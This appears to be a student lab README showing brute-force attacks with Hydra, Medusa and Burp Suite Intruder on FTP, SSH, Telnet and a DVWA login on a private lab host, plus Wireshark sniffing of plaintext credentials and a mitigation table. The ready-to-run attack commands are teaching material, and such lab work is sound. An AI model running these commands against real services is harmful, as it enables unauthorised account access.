
---


# 🔐 Cryptography Project  
### 🚀 Brute Force & Traffic Analysis on Network Protocols

[![Built with ❤️ in Kali Linux](https://img.shields.io/badge/Built%20with-❤️%20in%20Kali%20Linux-red?style=flat-square)]()  
[![Tools Used](https://img.shields.io/badge/Tools-Hydra%2C%20Medusa%2C%20BurpSuite%2C%20Wireshark-blueviolet?style=flat-square)]()  
[![Security](https://img.shields.io/badge/Security-Focus-red?style=flat-square)]()

---

## 🎯 Objective
- 🔍 Explore vulnerabilities in network protocols  
- 💥 Perform brute-force attacks on services  
- 📊 Analyze traffic using Wireshark  

---

## 🧑‍💻 Discovering Usernames

```bash
nmap -sV -p- <target machine>
```
![alt text](image-40.png)

---

## 🗒️ Creating `users.txt` and `passwords.txt`

```bash
echo -e "msfadmin\nroot\nadmin" > users.txt
echo -e "msfadmin\n1234\ntoor\npassword" > passwords.txt
```
![Users and Passwords Files](image-2.png)

---

## 🚀 Brute Forcing

### 📁 FTP (Port 21)

```bash
hydra -L users.txt -P passwords.txt ftp://192.168.109.136
```
![FTP Hydra Attack](image-3.png)

---

### 🔐 SSH (Port 22)

#### Using Hydra:
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.109.136
```
![SSH Hydra Attack](image-5.png)

#### Using Medusa:
```bash
medusa -h 192.168.109.136 -U users.txt -P passwords.txt -M ssh
```
![Medusa Attack](image-6.png)

---
### 🔐 Telnet (Port 23)

#### Using Hydra:
```bash
hydra -L users.txt -P passwords.txt telnet://192.168.109.136
```
![alt text](image-33.png)


---
### 🔐 SSH (Port 23)

#### Using Hydra:
```bash
medusa -h 192.168.109.136 -U users.txt -P passwords.txt -M ssh
```
![alt text](image-39.png)


### 🔑 Manual SSH Login (After Success)

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.109.136
```
![Manual SSH Login](image-8.png)
## 🌐 Web App Login Brute Force (DVWA on HTTP)

Browse to: [http://192.168.109.136](http://192.168.109.136)  
DVWA Login Page:
![DVWA](image-9.png)

```bash
hydra -L users.txt -P passwords.txt 192.168.109.136 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```
![Hydra Web Attack](image-10.png)

---

### 🔓 After Login
- Go to `DVWA Security`
- Set to `Low`
![DVWA Security Settings](image-12.png)

---

## 🎯 Brute Forcing Web Logins via BurpSuite Intruder

### 🛠 Step 1: Configure Proxy

- Proxy: `127.0.0.1:8080`  
![Burp Proxy Setup](image-13.png)

Verify: [http://burpsuite](http://burpsuite)  
![Burp Home](image-14.png)

---

### ✉️ Step 2: Intercept Login Request

- Login with dummy credentials  
- Capture the POST request  
![Captured POST Request](image-16.png)

---

### 🚀 Step 3: Send to Intruder

- Highlight password field → Add Intruder position  
```http
username=admin&password=§test§&Login=Login
```
![Set Positions](image-19.png)

---

### 🧨 Step 4: Add Payloads

- Payload type: `Simple list`  
- Load from `passwords.txt`  
![Load Payloads](image-20.png)

🧾 **Results:**  
![Intruder Attack Result](image-21.png)

---

## 📡 Wireshark Traffic Sniffing

1. Start Wireshark on `eth0`  
2. Run:

FOR FTP : 
```bash
hydra -L users.txt -P passwords.txt ftp://192.168.109.136
```
![Hydra During Capture](image-22.png)

Captured traffic:
- Credentials seen in **plaintext**!
![Captured FTP Credentials](image-24.png)

---

FOR TELNET :
```bash
hydra -L users.txt -P passwords.txt 192.168.109.136 telnet
```
Brute-force attack using Hydra on Telnet.

![alt text](image-41.png)
![alt text](image-42.png)

```

FOR SSH :

```bash
medusa -h 192.168.109.136 -U users.txt -P passwords.txt -M ssh
```
Brute-force attack using Medusa on SSH.

![alt text](image-43.png)
![alt text](image-44.png)


as we can see it is encrypted

---

### 🛡️ Mitigation Strategies

| **Protocol** | **Vulnerability**                | **Secure Alternative**          |
|--------------|-----------------------------------|---------------------------------|
| **FTP**      | Transmits in plaintext            | Use **SFTP** (over SSH)         |
| **Telnet**   | Transmits in plaintext            | Use **SSH**                     |
| **HTTP**     | Insecure login forms              | Use **HTTPS**                   |
| **SSH**      | Susceptible to brute-force attacks | Enable **key-based auth**, **2FA**, and **rate limiting** |

---

